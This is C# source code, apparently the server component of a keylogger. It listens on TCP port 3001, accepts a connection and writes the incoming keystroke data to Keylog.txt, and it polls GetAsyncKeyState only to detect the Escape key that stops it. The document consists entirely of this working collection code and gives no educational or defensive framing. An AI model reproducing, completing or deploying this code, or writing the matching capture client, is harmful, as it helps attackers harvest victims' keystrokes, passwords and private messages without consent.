using System;
using System.IO;
using System.Net;
using System.Text;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Threading;


namespace Server
{
    
    class Program
    {
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(int i);
        static void Main(string[] args)
        {
            args=new string[]{"3001", "Keylog.txt"};
            TcpListener Listener = new TcpListener(IPAddress.Any, Int32.Parse(args[0]));
            Listener.Start();
            Console.WriteLine("Servidor funcionando en puerto ("+args[0]+")");
            Console.WriteLine("Esperando conexion...");

            Socket Puerta = Listener.AcceptSocket();
            Console.WriteLine("Conexion aceptada de "+ Puerta.RemoteEndPoint);
            StreamWriter writer= new StreamWriter(args[1]);
            byte[] Recive;
            int longitud;
            int i;
            int i2=0;
            while(true){
                Recive=new byte[100];
                longitud=Puerta.Receive(Recive);
                for (i=0;i<longitud;i++){
                    writer.Write(Convert.ToChar(Recive[i]));
                }
                i2++;
                if(GetResponse()==27){
                    writer.Flush();
                    break;
                }
                
            }
            
        }
        static int GetResponse()
        {
            for (int i = 0; i < 255; i++)
            {
                
                int key = GetAsyncKeyState(i);
                
                if (key==32768)
                {
                    return i;
                }
            }
            return -1;
        }
        
    }
}
